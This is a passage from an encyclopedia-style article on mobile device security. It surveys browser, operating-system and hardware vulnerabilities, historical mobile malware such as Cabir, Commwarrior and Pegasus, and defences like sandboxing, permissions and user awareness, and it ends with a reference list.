The mobile web browser is an emerging attack vector for mobile devices. Just as common Web browsers, mobile web browsers are extended from pure web navigation with widgets and plug-ins, or are completely native mobile browsers.
Jailbreaking the iPhone with firmware 1.1.1 was based entirely on vulnerabilities on the web browser.[25] As a result, the exploitation of the vulnerability described here underlines the importance of the Web browser as an attack vector for mobile devices. In this case, there was a vulnerability based on a stack-based buffer overflow in a library used by the web browser (LibTIFF).
A vulnerability in the web browser for Android was discovered in October 2008.[26] As the iPhone vulnerability above, it was due to an obsolete and vulnerable library. A significant difference with the iPhone vulnerability was Android's sandboxing architecture which limited the effects of this vulnerability to the Web browser process.
Smartphones are also victims of classic piracy related to the web: phishing, malicious websites, software that run in the background, etc. The big difference is that smartphones do not yet have strong antivirus software available.[2]
The internet offers numerous interactive features that ensure a higher engagement rate, capture more and relevant data, and increase brand loyalty. Blogs, forums, social networks, and wikis are some of the most common interactive websites. Due to the tremendous growth of the internet, there has been a rapid rise in the number of security breaches experienced by individuals and businesses over the past few years. Users can balance the need to utilize the interactive features while also maintaining caution regarding security issues in several ways.[27] Reviewing computer security regularly and correcting, upgrading, and replacing the necessary features are a few of the ways to do this. Installation of antivirus and anti-spyware programs is the most effective way of protecting the computer, and they offer protection against malware, spyware, and viruses. As well, they use firewalls, which are typically installed between the internet and the computer network in order to find a balance. By acting as a web server, the firewall prevents external users from accessing the internal computer system. Also, secure passwords and not sharing them help maintain the balance.[28]

Operating system[edit]
See also: Operating system § Security
Sometimes it is possible to overcome the security safeguards by modifying the operating system itself. As real-world examples, this section covers the manipulation of firmware and malicious signature certificates. These attacks are difficult.
In 2004, vulnerabilities in virtual machines running on certain devices were revealed. It was possible to bypass the bytecode verifier and access the native underlying operating system.[3] The results of this research were not published in detail. The firmware security of Nokia's Symbian Platform Security Architecture (PSA) is based on a central configuration file called SWIPolicy. In 2008, it was possible to manipulate the Nokia firmware before it is installed, and in fact in some downloadable versions of it, this file was human-readable, so it was possible to modify and change the image of the firmware.[29] This vulnerability has been solved by an update from Nokia.
In theory, smartphones have an advantage over hard drives since the OS files are in ROM, and cannot be changed by malware. However, in some systems it was possible to circumvent this: in the Symbian OS it was possible to overwrite a file with a file of the same name.[29] On the Windows OS, it was possible to change a pointer from a general configuration file to an editable file.
When an application is installed, the signing of this application is verified by a series of certificates. One can create a valid signature without using a valid certificate and add it to the list.[30] In the Symbian OS all certificates are in the directory: c:\resource\swicertstore\dat. With firmware changes explained above, it is very easy to insert a seemingly valid but malicious certificate.
Android is the OS that has been attacked the most. Because it has most of users among the operation systems. According to cybersecurity company, it reported that they have blocked about 18 millions attack in 2016.[31]

Attacks based on hardware vulnerabilities[edit]
Electromagnetic Waveforms[edit]
In 2015, researchers at the French government agency Agence nationale de la sécurité des systèmes d'information (ANSSI) demonstrated the capability to trigger the voice interface of certain smartphones remotely by using "specific electromagnetic waveforms".[5] The exploit took advantage of antenna-properties of headphone wires while plugged into the audio-output jacks of the vulnerable smartphones and effectively spoofed audio input to inject commands via the audio interface.[5]

Juice Jacking[edit]
See also: Juice jacking
Juice Jacking is a physical or hardware vulnerability specific to mobile platforms. Utilizing the dual purpose of the USB charge port, many devices have been susceptible to having data exfiltrated from, or malware installed onto a mobile device by utilizing malicious charging kiosks set up in public places or hidden in normal charge adapters.

Jail-breaking and rooting[edit]
Jail-breaking is also a physical access vulnerability, in which mobile device users initiate to hack into the devices to unlock it, and exploit weaknesses in the operating system. Mobile device users take control of their own device by jail-breaking it, and customize the interface by installing applications, change system settings that are not allowed on the devices. Thus, allowing to tweak the mobile devices operating systems processes, run programs in the background, thus devices are being expose to variety of malicious attack that can lead to compromise important private data.[4]

Password cracking[edit]
In 2010, researcher from the University of Pennsylvania investigated the possibility of cracking a device's password through a smudge attack (literally imaging the finger smudges on the screen to discern the user's password).[27] The researchers were able to discern the device password up to 68% of the time under certain conditions.[27] Outsiders may perform over-the-shoulder on victims, such as watching specific keystrokes or pattern gestures, to unlock device password or passcode.

Malicious software (malware)[edit]
Main article: Mobile malware
As smartphones are a permanent point of access to the internet (mostly on), they can be compromised as easily as computers with malware. A malware is a computer program that aims to harm the system in which it resides. Mobile malware variants have increased by 54% in the year 2017.[32] Trojans, worms and viruses are all considered malware. A Trojan is a program that is on the smartphone and allows external users to connect discreetly. A worm is a program that reproduces on multiple computers across a network. A virus is a malicious software designed to spread to other computers by inserting itself into legitimate programs and running programs in parallel. However, it must be said that the malware are far less numerous and important to smartphones as they are to computers.

 Types of malware based on their number of smartphones in 2009[33]
Nonetheless, recent studies show that the evolution of malware in smartphones have rocketed in the last few years posing a threat to analysis and detection.[26]

Privacy-intruding common apps and problematic pre-installed software[edit]
Various common apps installed by millions can intrude privacy, even if they were installed from a software distribution service like the Google Play Store. For example, in 2022 it was shown that the popular app TikTok adds a keylogger to its, on iOS essentially unavoidable, in-app browser in iOS, which allows its Chinese company to gather, for example, passwords, credit card details, and everything else that is typed into websites opened from taps on any external links within the app. Shortly after the report, the company claims such capabilities are only used for debugging-types of purposes.[34][35] To date, it has largely not been investigated which and to which extent (other) apps have capacities for such or similar data-collection.[34][35][additional citation(s) needed]
The firmware and "stock software" preinstalled on devices – and updated with preinstalled software – can also have undesired components or privacy-intruding default configurations or substantial security vulnerabilities, albeit extensive research investigating this potential issue may be missing.[36][37][38][additional citation(s) needed]
Analysis of data traffic by popular smartphones running variants of Android found substantial by-default data collection and sharing with no opt-out by pre-installed software.[39][40] This issue also can't be addressed by conventional security patches. Outgoing Internet traffic can be analyzed with packet analyzers and with firewall apps like the NetGuard firewall app for Android that allows reading blocked traffic logs.[41][additional citation(s) needed]

The three phases of malware attacks[edit]
Typically an attack on a smartphone made by malware takes place in 3 phases: the infection of a host, the accomplishment of its goal, and the spread of the malware to other systems. Malware often uses the resources offered by infected smartphones. It will use the output devices such as Bluetooth or infrared, but it may also use the address book or email address of the person to infect the user's acquaintances. The malware exploits the trust that is given to data sent by an acquaintance.

Infection[edit]
Infection is the means used by the malware to get into the smartphone, it can either use one of the faults previously presented or may use the gullibility of the user. Infections are classified into four classes according to their degree of user interaction:[42]

Explicit permission
The most benign interaction is to ask the user if it is allowed to infect the machine, clearly indicating its potential malicious behavior. This is typical behavior of a proof of concept malware.
Implied permission
This infection is based on the fact that the user has a habit of installing software. Most trojans try to seduce the user into installing attractive applications (games, useful applications etc.) that actually contain malware.
Common interaction
This infection is related to a common behavior, such as opening an MMS or email.
No interaction
The last class of infection is the most dangerous. Indeed, a worm that could infect a smartphone and could infect other smartphones without any interaction would be catastrophic.
Accomplishment of its goal[edit]
Once the malware has infected a phone it will also seek to accomplish its goal, which is usually one of the following: monetary damage, damage data and/or device, and concealed damage:[43]

Monetary damages
The attacker can steal user data and either sell them to the same user or sell to a third party.
Damage
Malware can partially damage the device, or delete or modify data on the device.
Concealed damage
The two aforementioned types of damage are detectable, but the malware can also leave a backdoor for future attacks or even conduct wiretaps.
Spread to other systems[edit]
Once the malware has infected a smartphone, it always aims to spread one way or another:[44]

It can spread through proximate devices using Wi-Fi, Bluetooth and infrared;
It can also spread using remote networks such as telephone calls or SMS or emails.
Examples of malware[edit]
Here are various malware that exist in the world of smartphones with a short description of each.

Viruses and trojans[edit]
Main article: Mobile virus
Cabir (also known as Caribe, SybmOS/Cabir, Symbian/Cabir and EPOC.cabir) is the name of a computer worm developed in 2004, designed to infect mobile phones running Symbian OS. It is believed to have been the first computer worm that can infect mobile phones.
Commwarrior, founded in March 7, 2005, was the first worm that can infect many machines from MMS.[16] It is sent as COMMWARRIOR.ZIP containing the file COMMWARRIOR.SIS. When this file is executed, Commwarrior attempts to connect to nearby devices by Bluetooth or infrared under a random name. It then attempts to send MMS message to the contacts in the smartphone with different header messages for each person, who receive the MMS and often open them without further verification.
Phage is the first Palm OS virus discovered.[16] It transfers to the Palm from a PC via synchronization. It infects all applications in the smartphone and embeds its own code to function without the user and the system detecting it. All that the system will detect is that its usual applications are functioning.
RedBrowser is a Trojan based on java.[16] The Trojan masquerades as a program called "RedBrowser" which allows the user to visit WAP sites without a WAP connection. During application installation, the user sees a request on their phone that the application needs permission to send messages. If the user accepts, RedBrowser can send SMS to paid call centers. This program uses the smartphone's connection to social networks (Facebook, Twitter, etc.) to get the contact information for the user's acquaintances (provided the required permissions have been given) and will send them messages.
WinCE.PmCryptic.A is a malicious software on Windows Mobile which aims to earn money for its authors. It uses the infestation of memory cards that are inserted in the smartphone to spread more effectively.[45]
CardTrap is a virus that is available on different types of smartphone, which aims to deactivate the system and third-party applications. It works by replacing the files used to start the smartphone and applications to prevent them from executing.[46] There are different variants of this virus such as Cardtrap.A for SymbOS devices. It also infects the memory card with malware capable of infecting Windows.
Ghost Push is malicious software on Android OS which automatically roots the android device and installs malicious applications directly to system partition then unroots the device to prevent users from removing the threat by master reset (The threat can be removed only by reflashing). It cripples the system resources, executes quickly, and is hard to detect.
Ransomware[edit]
Mobile ransomware is a type of malware that locks users out of their mobile devices in a pay-to-unlock-your-device ploy, it has grown by leaps and bounds as a threat category since 2014.[47] Specific to mobile computing platforms, users are often less security-conscious, particularly as it pertains to scrutinizing applications and web links trusting the native protection capability of the mobile device operating system. Mobile ransomware poses a significant threat to businesses reliant on instant access and availability of their proprietary information and contacts. The likelihood of a traveling businessman paying a ransom to unlock their device is significantly higher since they are at a disadvantage given inconveniences such as timeliness and less likely direct access to IT staff. Recent ransomware attack has caused a stir in the world as the attack caused many of the internet connected devices to not work and companies spent a large amount to recover from these attacks.

Spyware[edit]
Main article: Spyware
Pegasus – In 2021, journalists and researchers reported the discovery of spyware, called Pegasus, developed and distributed by a private company which can and has been used to infect both iOS and Android smartphones often – partly via use of 0-day exploits – without the need for any user-interaction or significant clues to the user and then be used to exfiltrate data, track user locations, capture film through its camera, and activate the microphone at any time.[48]
Flexispy is an application that can be considered as a trojan, based on Symbian. The program sends all information received and sent from the smartphone to a Flexispy server. It was originally created to protect children and spy on adulterous spouses.[16][28]
Number of malware[edit]
Below is a diagram which loads the different behaviors of smartphone malware in terms of their effects on smartphones:[33]

 Effects of Malware
We can see from the graph that at least 50 malware varieties exhibit no negative behavior, except their ability to spread.[33]

Portability of malware across platforms[edit]
There is a multitude of malware. This is partly due to the variety of operating systems on smartphones. However attackers can also choose to make their malware target multiple platforms, and malware can be found which attacks an OS but is able to spread to different systems.
To begin with, malware can use runtime environments like Java virtual machine or the .NET Framework. They can also use other libraries present in many operating systems.[49] Other malware carry several executable files in order to run in multiple environments and they utilize these during the propagation process. In practice, this type of malware requires a connection between the two operating systems to use as an attack vector. Memory cards can be used for this purpose, or synchronization software can be used to propagate the virus.

Countermeasures[edit]
The security mechanisms in place to counter the threats described above are presented in this section. They are divided into different categories, as all do not act at the same level, and they range from the management of security by the operating system to the behavioral education of the user. The threats prevented by the various measures are not the same depending on the case. Considering the two cases mentioned above, in the first case one would protect the system from corruption by an application, and in the second case the installation of a suspicious software would be prevented.

Security in operating systems[edit]
The first layer of security in a smartphone is the operating system (OS). Beyond needing to handle the usual roles of an operating system (e.g. resource management, scheduling processes) on the device, it must also establish the protocols for introducing external applications and data without introducing risk.[citation needed]
A central paradigm in mobile operating systems is the idea of a sandbox. Since smartphones are currently designed to accommodate many applications, they must have mechanisms to ensure these applications are safe for the phone itself, for other applications and data on the system, and for the user. If a malicious program reaches a mobile device, the vulnerable area presented by the system must be as small as possible. Sandboxing extends this idea to compartmentalize different processes, preventing them from interacting and damaging each other. Based on the history of operating systems, sandboxing has different implementations. For example, where iOS will focus on limiting access to its public API for applications from the App Store by default, Managed Open In allows you to restrict which apps can access which types of data. Android bases it's sandboxing on its legacy of Linux and TrustedBSD.
The following points highlight mechanisms implemented in operating systems, especially Android.

Rootkit Detectors
The intrusion of a rootkit in the system is a great danger in the same way as on a computer. It is important to prevent such intrusions, and to be able to detect them as often as possible. Indeed, there is concern that with this type of malicious program, the result could be a partial or complete bypass of the device security, and the acquisition of administrator rights by the attacker. If this happens, then nothing prevents the attacker from studying or disabling the safety features that were circumvented, deploying the applications they want, or disseminating a method of intrusion by a rootkit to a wider audience.[50][51] We can cite, as a defense mechanism, the Chain of trust in iOS. This mechanism relies on the signature of the different applications required to start the operating system, and a certificate signed by Apple. In the event that the signature checks are inconclusive, the device detects this and stops the boot-up.[52] If the Operating System is compromised due to Jailbreaking, rootkit detection may not work if it is disabled by the Jailbreak method or software is loaded after Jailbreak disables Rootkit Detection.
Process isolation
Android uses mechanisms of user process isolation inherited from Linux. Each application has a user associated with it, and a tuple (UID, GID). This approach serves as a sandbox: while applications can be malicious, they can not get out of the sandbox reserved for them by their identifiers, and thus cannot interfere with the proper functioning of the system. For example, since it is impossible for a process to end the process of another user, an application can thus not stop the execution of another.[50][53][54][55][56]
File permissions
From the legacy of Linux, there are also filesystem permissions mechanisms. They help with sandboxing: a process can not edit any files it wants. It is therefore not possible to freely corrupt files necessary for the operation of another application or system. Furthermore, in Android there is the method of locking memory permissions. It is not possible to change the permissions of files installed on the SD card from the phone, and consequently it is impossible to install applications.[57][58][59]
Memory Protection
In the same way as on a computer, memory protection prevents privilege escalation. Indeed, if a process managed to reach the area allocated to other processes, it could write in the memory of a process with rights superior to their own, with root in the worst case, and perform actions which are beyond its permissions on the system. It would suffice to insert function calls are authorized by the privileges of the malicious application.[56]
Development through runtime environments
Software is often developed in high-level languages, which can control what is being done by a running program. For example, Java Virtual Machines continuously monitor the actions of the execution threads they manage, monitor and assign resources, and prevent malicious actions. Buffer overflows can be prevented by these controls.[60][61][56]
Security software[edit]
Above the operating system security, there is a layer of security software. This layer is composed of individual components to strengthen various vulnerabilities: prevent malware, intrusions, the identification of a user as a human, and user authentication. It contains software components that have learned from their experience with computer security; however, on smartphones, this software must deal with greater constraints (see limitations).

Antivirus and firewall
An antivirus software can be deployed on a device to verify that it is not infected by a known threat, usually by signature detection software that detects malicious executable files. A firewall, meanwhile, can watch over the existing traffic on the network and ensure that a malicious application does not seek to communicate through it. It may equally verify that an installed application does not seek to establish suspicious communication, which may prevent an intrusion attempt.[62][63][64][51]
A mobile antivirus product would scan files and compare them against a database of known mobile malware code signatures.[8]

Visual Notifications
In order to make the user aware of any abnormal actions, such as a call they did not initiate, one can link some functions to a visual notification that is impossible to circumvent. For example, when a call is triggered, the called number should always be displayed. Thus, if a call is triggered by a malicious application, the user can see, and take appropriate action.
Turing test
In the same vein as above, it is important to confirm certain actions by a user decision. The Turing test is used to distinguish between a human and a virtual user, and it often comes as a captcha.
Biometric identification
Another method to use is biometrics.[65] Biometrics is a technique of identifying a person by means of their morphology(by recognition of the face or eye, for example) or their behavior (their signature or way of writing for example). One advantage of using biometric security is that users can avoid having to remember a password or other secret combination to authenticate and prevent malicious users from accessing their devices. In a system with strong biometric security, only the primary user can access the smartphone.
Resource monitoring in the smartphone[edit]
When an application passes the various security barriers, it can take the actions for which it was designed. When such actions are triggered, the activity of a malicious application can be sometimes detected if one monitors the various resources used on the phone. Depending on the goals of the malware, the consequences of infection are not always the same; all malicious applications are not intended to harm the devices on which they are deployed. The following sections describe different ways to detect suspicious activity.[66]

Battery
Some malware is aimed at exhausting the energy resources of the phone. Monitoring the energy consumption of the phone can be a way to detect certain malware applications.[50]
Memory usage
Memory usage is inherent in any application. However, if one finds that a substantial proportion of memory is used by an application, it may be flagged as suspicious.
Network traffic
On a smartphone, many applications are bound to connect via the network, as part of their normal operation. However, an application using a lot of bandwidth can be strongly suspected of attempting to communicate a lot of information, and disseminate data to many other devices. This observation only allows a suspicion, because some legitimate applications can be very resource-intensive in terms of network communications, the best example being streaming video.
Services
One can monitor the activity of various services of a smartphone. During certain moments, some services should not be active, and if one is detected, the application should be suspected. For example, the sending of an SMS when the user is filming video: this communication does not make sense and is suspicious; malware may attempt to send SMS while its activity is masked.[67]
The various points mentioned above are only indications and do not provide certainty about the legitimacy of the activity of an application. However, these criteria can help target suspicious applications, especially if several criteria are combined.

Network surveillance[edit]
Network traffic exchanged by phones can be monitored. One can place safeguards in network routing points in order to detect abnormal behavior. As the mobile's use of network protocols is much more constrained than that of a computer, expected network data streams can be predicted (e.g. the protocol for sending an SMS), which permits detection of anomalies in mobile networks.[68]

Spam filters
As is the case with email exchanges, we can detect a spam campaign through means of mobile communications (SMS, MMS). It is therefore possible to detect and minimize this kind of attempt by filters deployed on network infrastructure that is relaying these messages.
Encryption of stored or transmitted information
Because it is always possible that data exchanged can be intercepted, communications, or even information storage, can rely on encryption to prevent a malicious entity from using any data obtained during communications. However, this poses the problem of key exchange for encryption algorithms, which requires a secure channel.
Telecom network monitoring
The networks for SMS and MMS exhibit predictable behavior, and there is not as much liberty compared with what one can do with protocols such as TCP or UDP. This implies that one cannot predict the use made of the common protocols of the web; one might generate very little traffic by consulting simple pages, rarely, or generate heavy traffic by using video streaming. On the other hand, messages exchanged via mobile phone have a framework and a specific model, and the user does not, in a normal case, have the freedom to intervene in the details of these communications. Therefore, if an abnormality is found in the flux of network data in the mobile networks, the potential threat can be quickly detected.
Manufacturer surveillance[edit]
In the production and distribution chain for mobile devices, it is the responsibility of manufacturers to ensure that devices are delivered in a basic configuration without vulnerabilities. Most users are not experts and many of them are not aware of the existence of security vulnerabilities, so the device configuration as provided by manufacturers will be retained by many users. Below are listed several points which manufacturers should consider. Some of the smartphone manufacturers insert Titan M2 to powers up mobile security.[69][70]

Remove debug mode
Phones are sometimes set in a debug mode during manufacturing, but this mode must be disabled before the phone is sold. This mode allows access to different features, not intended for routine use by a user. Due to the speed of development and production, distractions occur and some devices are sold in debug mode. This kind of deployment exposes mobile devices to exploits that utilize this oversight.[71][72]
Default settings
When a smartphone is sold, its default settings must be correct, and not leave security gaps. The default configuration is not always changed, so a good initial setup is essential for users. There are, for example, default configurations that are vulnerable to denial of service attacks.[50][73]
Security audit of apps
Along with smart phones, appstores have emerged. A user finds themselves facing a huge range of applications. This is especially true for providers who manage appstores because they are tasked with examining the apps provided, from different points of view (e.g. security, content). The security audit should be particularly cautious, because if a fault is not detected, the application can spread very quickly within a few days, and infect a significant number of devices.[50]
Detect suspicious applications demanding rights
When installing applications, it is good to warn the user against sets of permissions that, grouped together, seem potentially dangerous, or at least suspicious. Frameworks like such as Kirin, on Android, attempt to detect and prohibit certain sets of permissions.[74]
Revocation procedures
Along with appstores appeared a new feature for mobile apps: remote revocation. First developed by Android, this procedure can remotely and globally uninstall an application, on any device that has it. This means the spread of a malicious application that managed to evade security checks can be immediately stopped when the threat is discovered.[75][76]
Avoid heavily customized systems
Manufacturers are tempted to overlay custom layers on existing operating systems, with the dual purpose of offering customized options and disabling or charging for certain features. This has the dual effect of risking the introduction of new bugs in the system, coupled with an incentive for users to modify the systems to circumvent the manufacturer's restrictions. These systems are rarely as stable and reliable as the original, and may suffer from phishing attempts or other exploits.[citation needed]
Improve software patch processes
New versions of various software components of a smartphone, including operating systems, are regularly published. They correct many flaws over time. Nevertheless, manufacturers often do not deploy these updates to their devices in a timely fashion, and sometimes not at all. Thus, vulnerabilities persist when they could be corrected, and if they are not, since they are known, they are easily exploitable.[74]
User awareness[edit]
Much malicious behavior is allowed by the carelessness of the user. Smartphone users were found to ignore security messages during application installation, especially during application selection, checking application reputation, reviews and security and agreement messages.[77] From simply not leaving the device without a password, to precise control of permissions granted to applications added to the smartphone, the user has a large responsibility in the cycle of security: to not be the vector of intrusion. This precaution is especially important if the user is an employee of a company who stores business data on the device. Detailed below are some precautions that a user can take to manage security on a smartphone.
A recent survey by internet security experts BullGuard showed a lack of insight into the rising number of malicious threats affecting mobile phones, with 53% of users claiming that they are unaware of security software for Smartphones. A further 21% argued that such protection was unnecessary, and 42% admitted it hadn't crossed their mind ("Using APA," 2011). These statistics show consumers are not concerned about security risks because they believe it is not a serious problem. The key here is to always remember smartphones are effectively handheld computers and are just as vulnerable.

Being skeptical
A user should not believe everything that may be presented, as some information may be phishing or attempting to distribute a malicious application. It is therefore advisable to check the reputation of the application that they want to buy before actually installing it.[78]
Permissions given to applications
The mass distribution of applications is accompanied by the establishment of different permissions mechanisms for each operating system. It is necessary to clarify these permissions mechanisms to users, as they differ from one system to another, and are not always easy to understand. In addition, it is rarely possible to modify a set of permissions requested by an application if the number of permissions is too great. But this last point is a source of risk because a user can grant rights to an application, far beyond the rights it needs. For example, a note taking application does not require access to the geolocation service. The user must ensure the privileges required by an application during installation and should not accept the installation if requested rights are inconsistent.[79][73][80]
Be careful
Protection of a user's phone through simple gestures and precautions, such as locking the smartphone when it is not in use, not leaving their device unattended, not trusting applications, not storing sensitive data, or encrypting sensitive data that cannot be separated from the device.[81][82]

Disconnect peripheral devices, that are not in use
NIST Guidelines for Managing the Security of Mobile Devices 2013, recommends: Restrict user and application access to hardware, such as the digital camera, GPS, Bluetooth interface, USB interface, and removable storage.

Enable Android Device Encryption[edit]
The latest Android smartphones come with an inbuilt encryption setting for securing all the information saved on your device. It makes it difficult for a hacker to extract and decipher the information in case your device is compromised. Here is how to do it,
Settings – Security – Encrypt Phone + Encrypt SD Card


Ensure data
Smartphones have a significant memory and can carry several gigabytes of data. The user must be careful about what data it carries and whether they should be protected. While it is usually not dramatic if a song is copied, a file containing bank information or business data can be more risky. The user must have the prudence to avoid the transmission of sensitive data on a smartphone, which can be easily stolen. Furthermore, when a user gets rid of a device, they must be sure to remove all personal data first.[83]
These precautions are measures that leave no easy solution to the intrusion of people or malicious applications in a smartphone. If users are careful, many attacks can be defeated, especially phishing and applications seeking only to obtain rights on a device.

Centralized storage of text messages[edit]
One form of mobile protection allows companies to control the delivery and storage of text messages, by hosting the messages on a company server, rather than on the sender or receiver's phone. When certain conditions are met, such as an expiration date, the messages are deleted.[84]

Limitations of certain security measures[edit]
The security mechanisms mentioned in this article are to a large extent inherited from knowledge and experience with computer security. The elements composing the two device types are similar, and there are common measures that can be used, such as antivirus software and firewalls. However, the implementation of these solutions is not necessarily possible or at least highly constrained within a mobile device. The reason for this difference is the technical resources offered by computers and mobile devices: even though the computing power of smartphones is becoming faster, they have other limitations than their computing power.

Single-task system: Some operating systems, including some still commonly used, are single-tasking. Only the foreground task is executed. It is difficult to introduce applications such as antivirus and firewall on such systems, because they could not perform their monitoring while the user is operating the device, when there would be most need of such monitoring.
Energy autonomy: A critical one for the use of a smartphone is energy autonomy. It is important that the security mechanisms not consume battery resources, without which the autonomy of devices will be affected dramatically, undermining the effective use of the smartphone.
Network Directly related to battery life, network utilization should not be too high. It is indeed one of the most expensive resources, from the point of view of energy consumption. Nonetheless, some calculations may need to be relocated to remote servers in order to preserve the battery. This balance can make implementation of certain intensive computation mechanisms a delicate proposition.[85]
Furthermore, it is common to find that updates exist, or can be developed or deployed, but this is not always done. One can, for example, find a user who does not know that there is a newer version of the operating system compatible with the smartphone, or a user may discover known vulnerabilities that are not corrected until the end of a long development cycle, which allows time to exploit the loopholes.[72]

Next Generation of mobile security[edit]
There is expected to be four mobile environments that will make up the security framework:

Rich operating system
In this category will fall traditional Mobile OS like Android, iOS, Symbian OS or Windows Phone. They will provide the traditional functionality and security of an OS to the applications.
Secure Operating System (Secure OS)
A secure kernel which will run in parallel with a fully featured Rich OS, on the same processor core. It will include drivers for the Rich OS ("normal world") to communicate with the secure kernel ("secure world"). The trusted infrastructure could include interfaces like the display or keypad to regions of PCI-E address space and memories.
Trusted Execution Environment (TEE)
Made up of hardware and software. It helps in the control of access rights and houses sensitive applications, which need to be isolated from the Rich OS. It effectively acts as a firewall between the "normal world" and "secure world".
Secure Element (SE)
The SE consists of tamper resistant hardware and associated software or separate isolated hardware. It can provide high levels of security and work in tandem with the TEE. The SE will be mandatory for hosting proximity payment applications or official electronic signatures. SE may connect, disconnect, block peripheral devices and operate separate set of hardware.
Security Applications (SA)
Numerous security applications are available on App Stores providing services of protection from viruses and performing vulnerability assessment.[86]
See also[edit]
Browser security
Computer security
Information security
Mobile Malware
Mobile secure gateway
Phone hacking
Telephone tapping
Wireless Public Key Infrastructure (WPKI)
Wireless security
Defense strategy (computing)
Exploits of mobile security
Notes[edit]


^ a b c d e "What is mobile security (wireless security)? - Definition from WhatIs.com". WhatIs.com. Retrieved 2020-12-05.

^ a b Ng, Alfred. "Your smartphones are getting more valuable for hackers". CNET. Retrieved 2021-03-04.

^ a b c "BYOD and Increased Malware Threats Help Driving Billion Dollar Mobile Security Services Market in 2013". ABI Research. 2013-03-29. Retrieved 2018-11-11.

^ a b Michael SW Lee; Ian Soon (2017-06-13). "Taking a bite out of Apple: Jailbreaking and the confluence of brand loyalty, consumer resistance and the co-creation of value". Journal of Product & Brand Management. 26 (4): 351–364. doi:10.1108/JPBM-11-2015-1045. ISSN 1061-0421.

^ a b c Kasmi C, Lopes Esteves J (13 August 2015). "IEMI Threats for Information Security: Remote Command Injection on Modern Smartphones". IEEE Transactions on Electromagnetic Compatibility. 57 (6): 1752–1755. doi:10.1109/TEMC.2015.2463089. S2CID 34494009.
Andy Greenberg (14 October 2015). "Hackers Can Silently Control Siri From 16 Feet Away". Wired.

^ a b McCaney, Kevin. "'Unknowns' hack NASA, Air Force, saying 'We're here to help'". Retrieved May 7, 2012.

^ a b Bishop 2004.

^ a b c d e f Leavitt, Neal (2011). "Mobile Security: Finally a Serious Problem?". Computer. 44 (6): 11–14. doi:10.1109/MC.2011.184. S2CID 19895938.

^ Olson, Parmy. "Your smartphone is hackers' next big target". CNN. Retrieved August 26, 2013.

^ a b "Guide on Protection Against Hacking" (PDF). Mauritius National Computer Board. Archived from the original (PDF) on 2012-11-17.

^ Lemos, Robert. "New laws make hacking a black-and-white choice". CNET News.com. Retrieved September 23, 2002.

^ Bilton 2010.

^ a b c d e Guo, Wang & Zhu 2004, p. 3.

^ Dagon, Martin & Starder 2004, p. 12.

^ a b Dixon & Mishra 2010, p. 3.

^ a b c d e f g h Töyssy & Helenius 2006, p. 113.

^ Siemens 2010, p. 1.

^ Gendrullis 2008, p. 266.

^ European Telecommunications Standards Institute 2011, p. 1.

^ Jøsang, Miralabé & Dallot 2015.

^ Roth, Polak & Rieffel 2008, p. 220.

^ Gittleson, Kim (28 March 2014) Data-stealing Snoopy drone unveiled at Black Hat BBC News, Technology, Retrieved 29 March 2014

^ a b Töyssy & Helenius 2006, p. 27.

^ Mulliner 2006, p. 113.

^ Dunham, Abu Nimeh & Becher 2008, p. 225.

^ a b Suarez-Tangil, Guillermo; Juan E. Tapiador; Pedro Peris-Lopez; Arturo Ribagorda (2014). "Evolution, Detection and Analysis of Malware in Smart Devices" (PDF). IEEE Communications Surveys & Tutorials. 16 (2): 961–987. doi:10.1109/SURV.2013.101613.00077. S2CID 5627271. Archived from the original (PDF) on 2017-10-31. Retrieved 2013-11-11.

^ a b c 
Aviv, Adam J.; Gibson, Katherine; Mossop, Evan; Blaze, Matt; Smith, Jonathan M. Smudge Attacks on Smartphone Touch Screens (PDF). 4th USENIX Workshop on Offensive Technologies.

^ a b Hamilton, Keegan (July 11, 2018). "El Chapo's lawyers want to suppress evidence from spyware used to catch cheating spouses". Vice Media. The Thailand-based FlexiSPY bills itself as "the world's most powerful monitoring software," and the company's website lists prospective buyers as concerned parents who want to spy on their kids and companies interested in snooping on their employees. But the app has also been dubbed "stalkerware" because it was initially marketed to jealous spouses paranoid about infidelity.

^ a b Becher 2009, p. 65.

^ Becher 2009, p. 66.

^ Diogenes, Yuri (2019). Cybersecurity - Attack and Defense Strategies - Second Edition. Erdal Ozkaya, Safari Books Online (2nd ed.). p. 163. ISBN 978-1-83882-779-3. OCLC 1139764053.

^ "Eloqua - Error Information" (PDF).

^ a b c Schmidt et al. 2009a, p. 3.

^ a b "TikTok can track users' every tap as they visit other sites through iOS app, new research shows". The Guardian. 24 August 2022. Retrieved 16 September 2022.

^ a b "iOS Privacy: Announcing InAppBrowser.com - see what JavaScript commands get injected through an in-app browser · Felix Krause". krausefx.com. Retrieved 16 September 2022.

^ Spadafora, Anthony (13 August 2019). "Android phones come with pre-installed malware". TechRadar. Retrieved 4 November 2022.

^ "Millions of New Android Phones Sold With Preinstalled Malware". Digital Trends. 12 August 2019. Retrieved 4 November 2022.

^ "More pre-installed malware has been found in budget US smartphones". ZDNET. Retrieved 4 November 2022.

^ "Study reveals scale of data-sharing from Android mobile phones". Trinity College Dublin. Retrieved 16 November 2021.

^ Liu, Haoyu; Patras, Paul; Leith, Douglas J. (6 October 2021). "Android Mobile OS Snooping By Samsung, Xiaomi, Huawei and Realme Handsets" (PDF). Retrieved 16 November 2021.

^ "NetGuard FAQ". GitHub. 4 November 2022. Retrieved 4 November 2022.

^ Becher 2009, p. 87.

^ Becher 2009, p. 88.

^ Mickens & Noble 2005, p. 1.

^ Raboin 2009, p. 272.

^ Töyssy & Helenius 2006, p. 114.

^ Haas, Peter D. (2015). Ransomware goes mobile: An analysis of the threats posed by emerging methods (Thesis). Utica College. Archived from the original on 2016-02-24.

^ "What is Pegasus spyware and how does it hack phones?". The Guardian. 18 July 2021. Retrieved 13 August 2021.

^ Becher 2009, p. 91-94.

^ a b c d e Becher 2009, p. 12.

^ a b Schmidt, Schmidt & Clausen 2008, p. 5-6. sfn error: no target: CITEREFSchmidtSchmidtClausen2008 (help)

^ Halbronn & Sigwald 2010, p. 5-6.

^ Ruff 2011, p. 127.

^ Hogben & Dekker 2010, p. 50.

^ Schmidt, Schmidt & Clausen 2008, p. 50. sfn error: no target: CITEREFSchmidtSchmidtClausen2008 (help)

^ a b c Shabtai et al. 2009, p. 10.

^ Becher 2009, p. 31.

^ Schmidt, Schmidt & Clausen 2008, p. 3. sfn error: no target: CITEREFSchmidtSchmidtClausen2008 (help)

^ Shabtai et al. 2009, p. 7-8.

^ Pandya 2008, p. 15.

^ Becher 2009, p. 22.

^ Becher et al. 2011, p. 96.

^ Becher 2009, p. 128.

^ Becher 2009, p. 140.

^ Thirumathyam & Derawi 2010, p. 1.

